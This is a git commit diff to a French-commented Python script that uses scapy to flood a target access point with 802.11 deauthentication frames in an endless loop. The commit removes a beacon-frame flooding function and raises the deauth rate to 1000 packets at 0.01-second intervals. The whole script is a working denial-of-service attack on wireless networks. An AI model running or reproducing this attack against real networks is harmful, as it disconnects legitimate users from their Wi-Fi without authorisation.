e95cf6ad94aea159124e42ed3b97883a48fa2983
FoXhack1 <fox.pclyc@gmail.com>
2024-10-22 15:39:35 +0200

    Update wifi (1).py

--- wifi (1).py
+++ wifi (1).py
@@ -1,5 +1,6 @@
 import os
 import time
+import threading
 from scapy.all import *
 
 # Configuration
@@ -11,17 +12,9 @@ CANAL_CIBLE = 11  # Canal de la cible
 def attaque_deauth(bssid, canal):
     os.system(f"iwconfig {INTERFACE_WIRELESS} channel {canal}")
     packet = Dot11(type=0, subtype=12, addr1=bssid, addr2=bssid, addr3=bssid)
-    sendp(packet, iface=INTERFACE_WIRELESS, count=100, inter=0.1)
-
-# Fonction pour effectuer une attaque dos
-def attaque_dos(bssid, canal):
-    os.system(f"iwconfig {INTERFACE_WIRELESS} channel {canal}")
-    packet = Dot11(type=0, subtype=8, addr1=bssid, addr2=bssid, addr3=bssid)
-    sendp(packet, iface=INTERFACE_WIRELESS, count=100, inter=0.1)
+    sendp(packet, iface=INTERFACE_WIRELESS, count=1000, inter=0.01)
 
 # Boucle principale
 while True:
     attaque_deauth(BSSID_CIBLE, CANAL_CIBLE)
-    time.sleep(10)
-    attaque_dos(BSSID_CIBLE, CANAL_CIBLE)
     time.sleep(10)
